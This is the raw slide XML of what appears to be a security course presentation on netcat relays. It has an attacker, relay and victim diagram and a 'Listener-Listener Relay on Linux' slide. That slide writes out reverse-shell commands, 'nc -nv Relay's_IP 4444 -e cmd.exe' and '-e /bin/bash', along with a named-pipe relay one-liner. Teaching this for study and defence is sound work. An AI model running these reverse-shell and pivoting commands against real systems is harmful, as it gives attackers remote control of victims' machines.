        <p:spPr>
          <a:xfrm>
            <a:off x="7581416" y="4537586"/>
            <a:ext cx="1066800"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Standard Out</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="302" name="Google Shape;302;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6134548" y="4915352"/>
            <a:ext cx="845574"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1&gt;</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="303" name="Google Shape;303;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4268508" y="3440163"/>
            <a:ext cx="1242642"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PIPE</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="304" name="Google Shape;304;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2731679" y="2838133"/>
            <a:ext cx="1273278"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0&lt;</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="305" name="Google Shape;305;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="525292" y="2424500"/>
            <a:ext cx="1184787" cy="64633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Attacker types here</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="306" name="Google Shape;306;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="525292" y="5244166"/>
            <a:ext cx="1361767"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Attacker sees the result here</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="307" name="Google Shape;307;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7486650" y="2207367"/>
            <a:ext cx="118970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Responses from shell are here</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="308" name="Google Shape;308;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7562384" y="5244166"/>
            <a:ext cx="1253613" cy="92333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Shell gets commands here</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="309" name="Google Shape;309;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="1531857"/>
            <a:ext cx="139618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Attacker Machine</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="310" name="Google Shape;310;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3820995" y="1530929"/>
            <a:ext cx="1386349"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Relay Machine</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="311" name="Google Shape;311;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7229024" y="1495280"/>
            <a:ext cx="1396181" cy="64633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1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Victim Machine</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="312" name="Google Shape;312;p18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2431915" y="4193364"/>
            <a:ext cx="364231" cy="83574"/>
          </a:xfrm>
          <a:prstGeom prst="leftArrow">
            <a:avLst>
              <a:gd fmla="val 50000" name="adj1"/>
              <a:gd fmla="val 50000" name="adj2"/>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3" name="Google Shape;313;p18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1639657" y="4193364"/>
            <a:ext cx="364231" cy="83574"/>
          </a:xfrm>
          <a:prstGeom prst="leftArrow">
            <a:avLst>
              <a:gd fmla="val 50000" name="adj1"/>
              <a:gd fmla="val 50000" name="adj2"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk1"/>
          </a:solid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4" name="Google Shape;314;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="270387" y="2330245"/>
            <a:ext cx="1754444" cy="3972232"/>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5" name="Google Shape;315;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7109312" y="2207367"/>
            <a:ext cx="1696231" cy="4095110"/>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316" name="Google Shape;316;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3175373" y="2807439"/>
            <a:ext cx="1093136" cy="36933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chemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>backpipe</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="317" name="Google Shape;317;p18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3101693" y="2795475"/>
            <a:ext cx="1235981" cy="380853"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">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18" name="Google Shape;318;p18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2358961" y="2330245"/>
            <a:ext cx="4411492" cy="3972232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="127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2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300"/>
              <a:buFont typeface="Comic Sans MS"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Netcat Relay Case #3: Listener-Listener Relay on Linux</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="324" name="Google Shape;324;p2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p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="90C226"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Attacker machine</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="90C226"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t># nc –nv Relay's_IP 2222</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-57150" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="90C226"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="3F3F3F"/>
              </a:solidFill>
              <a:latin typeface="Comic Sans MS"/>
              <a:ea typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
              <a:sym typeface="Comic Sans MS"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="90C226"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Relay</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="90C226"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t># mknod backpipe p</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="90C226"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t># nc -l -p 2222 0&lt;backpipe | nc –l -p 4444 | tee backpipe</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="3F3F3F"/>
              </a:solidFill>
              <a:latin typeface="Comic Sans MS"/>
              <a:ea typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
              <a:sym typeface="Comic Sans MS"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="90C226"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>tee breaks the output of a program so that it can be both displayed and saved in a file. It does both the tasks simultaneously</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-57150" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="90C226"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="3F3F3F"/>
              </a:solidFill>
              <a:latin typeface="Comic Sans MS"/>
              <a:ea typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
              <a:sym typeface="Comic Sans MS"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="90C226"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Victim machine</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="90C226"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>C:\&gt; nc –nv Relay's_IP 4444 -e cmd.exe</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="90C226"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>$ nc –nv Relay’s_IP 4444 –e /bin/bash</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-38100" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="325" name="Google Shape;325;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2017-12-04T18:48:53Z</dcterms:created>
  <dc:creator>Windows User</dc:creator>
</cp:coreProperties>
</file>